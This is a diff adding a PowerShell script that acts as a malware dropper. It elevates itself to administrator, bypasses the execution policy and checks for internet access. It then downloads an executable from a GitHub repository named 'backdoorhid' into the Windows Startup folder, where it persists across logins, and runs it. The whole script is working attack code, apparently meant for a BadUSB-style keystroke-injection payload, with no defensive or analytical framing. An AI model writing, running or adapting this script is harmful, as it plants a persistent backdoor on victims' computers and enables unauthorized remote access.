@@ -1,0 +1,69 @@
+# Check if the script is running with administrative privileges
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# If not running as admin, relaunch the script with elevated privileges
+if (-not $isAdmin)
+{
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    Exit
+}
+
+# Set the path to the %USERPROFILE% folder
+$path = $path = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile), "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+
+
+$retryDelay = 10 * 60 # 10 minutes (in seconds)
+$retryAttempts = 3
+
+# Function to check internet connectivity
+function Test-InternetConnection {
+    param (
+        [int]$retryDelay,
+        [int]$retryAttempts
+    )
+
+    $attempts = 1
+
+    while ($attempts -le $retryAttempts) {
+        $pingResult = Test-Connection -ComputerName "www.google.com" -Count 1 -Quiet
+
+        if ($pingResult) {
+            return $true
+        }
+        else {
+            Write-Host "No internet connection available. Retrying in $retryDelay seconds (attempt $attempts of $retryAttempts)..."
+            Start-Sleep -Seconds $retryDelay
+            $attempts++
+        }
+    }
+
+    return $false
+}
+
+# Check internet connectivity
+$internetAvailable = Test-InternetConnection -retryDelay $retryDelay -retryAttempts $retryAttempts
+
+if ($internetAvailable) {
+    $url = "https://raw.githubusercontent.com/bytecodeshu/backdoorhid/main/user.exe"
+    $filename = "user.exe"
+    $outputPath = $path + '\' + $filename
+
+    # Download the file
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($url, $outputPath)
+    $wc.Dispose()
+
+    # Check if the file was downloaded successfully
+    if (Test-Path $outputPath) {
+        Write-Host "File downloaded successfully to $outputPath"
+        
+        # Run the downloaded file
+        Start-Process -FilePath $outputPath -Wait
+    }
+    else {
+        Write-Host "Failed to download the file"
+    }
+}
+else {
+    Write-Host "No internet connection available after $retryAttempts attempts."
+}
